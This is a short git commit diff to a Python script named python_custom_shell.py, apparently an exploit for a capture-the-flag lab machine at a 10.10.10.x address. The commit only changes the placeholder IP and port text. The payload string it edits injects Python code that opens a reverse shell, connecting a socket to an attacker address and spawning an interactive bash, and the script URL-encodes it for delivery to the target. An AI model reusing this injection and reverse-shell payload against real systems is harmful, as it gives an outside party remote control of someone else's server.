886119666da247171396f2c7201d1789746dae6f
sanjay babu <32395477+san3ncrypt3d@users.noreply.github.com>
2020-03-07 18:24:43 -0500

    Update python_custom_shell.py

--- python_custom_shell.py
+++ python_custom_shell.py
@@ -5,7 +5,7 @@ import os
 
 url='http://10.10.10.168:8080/'
 
-path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR tun0 IP ADDRESS",YOUR NETCAT PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
+path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS", PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
 print('Inital shell code:')
 # print(path+'\n')
 payload=urllib.parse.quote(path)
